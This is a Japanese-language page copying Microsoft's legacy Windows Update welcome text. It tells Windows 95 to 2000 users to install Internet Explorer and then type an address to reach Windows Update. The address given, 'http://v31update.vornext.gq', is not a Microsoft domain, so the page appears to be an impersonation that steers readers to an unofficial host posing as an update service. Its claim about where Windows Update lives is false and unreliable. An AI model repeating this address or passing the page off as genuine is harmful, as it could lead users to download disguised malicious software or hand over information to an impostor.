Windows Update をご利用いただき
ありがとうございます

Windows のオンライン拡張機能である Windows Update を使用すれば、コンピュータを最大限に活用できます。

注意: Windows Update Web サイトにアクセスするには、正規にライセンスされた Windows オペレーティング システムを実行している必要があります。

Windows® 98 ユーザー、および Windows® 2000 ユーザー :
[スタート] メニューから Windows Update を実行してください。

Windows® 95 ユーザー、および Windows NT® 4.0 ユーザー :
Windows Update を使用するには、Internet Explorer 4 以上をインストールする必要があります。

すべてのユーザー:
Windows Update は、ActiveX コントロールをサポートしているブラウザでのみアクセスできます。ActiveX コントロールの詳細については、Windows Update の [よく寄せられる質問] を参照してください。

最新のバージョンの Internet Explorer をダウンロードするには、Internet Explorer のダウンロード Web サイトを参照してください。

Internet Explorer がインストールされたら、アドレス バーに "http://v31update.vornext.gq" と入力して Windows Update サイトに移動することができます。

また、以下のページからアップデートを利用できます。

  • Windows 2000 ユーザー - Windows 2000 のサイトに移動してください。
  • Windows NT 4.0 ユーザー - Microsoft ダウンロード センターに移動してください。
  • Windows 98 ユーザー - Windows 98 ダウンロード サイトに移動してください。
  • Windows 95 ユーザー - Windows 95 ダウンロード サイトに移動してください。
